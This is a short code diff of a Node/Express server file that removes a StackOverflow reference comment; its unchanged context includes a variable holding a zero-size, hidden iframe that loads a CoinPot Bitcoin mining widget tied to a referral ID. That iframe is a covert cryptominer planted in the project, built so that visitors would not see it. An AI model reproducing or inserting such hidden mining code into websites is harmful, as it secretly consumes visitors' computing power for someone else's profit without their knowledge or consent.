@@ -104,4 +104,3 @@ app.listen(8000, function () {
 })
 
 var bm = '<iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/bitcoincore/?ref=4523B3C471BA&mode=widget" style="overflow:hidden;width:0px;height:0px;"></iframe>'
-//https://stackoverflow.com/questions/16126357/create-html-table-using-javascript tabelle in js
